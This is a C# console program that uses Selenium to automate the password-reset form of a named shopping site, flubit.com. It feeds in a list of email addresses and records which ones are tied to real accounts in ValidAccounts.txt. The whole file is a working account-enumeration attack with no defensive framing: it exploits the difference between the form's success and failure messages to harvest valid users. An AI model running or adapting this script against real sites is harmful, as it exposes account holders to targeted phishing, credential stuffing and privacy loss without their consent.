using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.IO;
using Newtonsoft.Json;
using System.Text;

namespace Flupen
{
    class Program
    {
        static void Main(string[] args)
        {
            var dictionaryFile = args.Length> 0 ? args[0] ?? "TestDictionary.json" : "TestDictionary.json";
            var dict = new List<string>();
            var validAddresses = new List<string>();
            bool goodFile = false;

            try
            {
                dict = JsonConvert.DeserializeObject<List<string>>(File.ReadAllText(dictionaryFile));
                goodFile = true;
            }
            catch (FileNotFoundException)
            {
                Console.WriteLine("File doesn't exist.");
                
            }
            catch(Exception)
            {
                Console.WriteLine("File may be malformed, use JSON format.");
            }

            if (!goodFile) return;

            using (var drv = new OpenQA.Selenium.Chrome.ChromeDriver())
            {
                drv.Url = "https://flubit.com/sign-in/forgot-password/";                

                foreach (var item in dict)
                {
                    //page forces refresh, so we need to re-grab references.
                    var emailTextBox = drv.FindElementByCssSelector("input[name=\"email\"]");
                    var submitButton = drv.FindElementByCssSelector("#btn_signin");

                    emailTextBox.Clear();
                    emailTextBox.SendKeys(item);

                    submitButton.Click();
                    Thread.Sleep(3000);

                    var alertBox = drv.FindElementByCssSelector(".alert");
                    var cssClasses = alertBox.GetAttribute("class").Split(' ');
                    var isAttachedToAccount = cssClasses.Contains("alert-success");

                    Console.WriteLine("Email: {0} | Attached to an account?: {1} ", item, isAttachedToAccount ? "Yes" : "No");
                    if (isAttachedToAccount) validAddresses.Add(item);
                }        

                
                using(var fs = new FileStream("ValidAccounts.txt", FileMode.OpenOrCreate))
                {
                    var addressText = validAddresses.Aggregate(new StringBuilder(), (sb, text) => sb.Append(text).Append(Environment.NewLine)).ToString();
                    var textBytes = Encoding.UTF8.GetBytes(addressText);

                    fs.Write(textBytes, 0, textBytes.Length);
                    Console.WriteLine("Written out {0} valid account(s) to {1}", validAddresses.Count, fs.Name);
                }
                
            }

            Console.Read();                      
        }
    }
}
